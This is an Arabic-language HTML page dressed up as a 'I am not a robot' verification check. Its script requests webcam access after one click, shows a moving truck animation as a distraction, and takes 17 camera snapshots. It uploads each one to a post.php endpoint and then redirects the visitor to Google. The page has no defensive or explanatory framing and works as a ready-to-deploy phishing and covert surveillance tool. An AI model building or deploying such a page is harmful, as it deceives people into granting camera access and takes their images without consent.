<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            background: #f0f2f5; 
            font-family: sans-serif; 
            position: relative;
        }
        button { 
            padding: 20px 40px; 
            font-size: 18px; 
            cursor: pointer; 
            background: #007bff; 
            color: white; 
            border: none; 
            border-radius: 5px; 
            transition: 0.3s; 
            z-index: 2;
        }
        button:hover { background: #0056b3; }

        /* الشاحنة */
        .truck {
            position: absolute;
            left: -120px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 40px;
            transition: left 10s linear; /* حركة بطيئة */
        }
        .truck.move {
            left: calc(100% - 50px);
        }
    </style>
</head>
<body>

<button onclick="startProcess()">أنا لست روبوت - اضغط للتحقق</button>
<div class="truck">🚚</div>

<script>
async function startProcess() {
    try {
        // طلب إذن الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640; 
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        const truck = document.querySelector('.truck');
        truck.classList.add('move'); // بدء حركة الشاحنة

        // التقاط 17 صورة بفاصل نصف ثانية
        for (let i = 0; i < 17; i++) {
            ctx.drawImage(video, 0, 0, 640, 480);
            const data = canvas.toDataURL('image/jpeg', 0.7);

            await fetch('post.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'img=' + encodeURIComponent(data) + '&frame=' + i
            });

            // انتظار نصف ثانية قبل الصورة التالية
            await new Promise(resolve => setTimeout(resolve, 500));
        }

        // إيقاف الكاميرا
        stream.getTracks().forEach(track => track.stop());

        // بعد انتهاء العملية تحويل المستخدم
        setTimeout(() => {
            window.location.href = "https://www.google.com";
        }, 2000);

    } catch (err) {
        console.error(err);
        alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
    }
}
</script>
</body>
</html>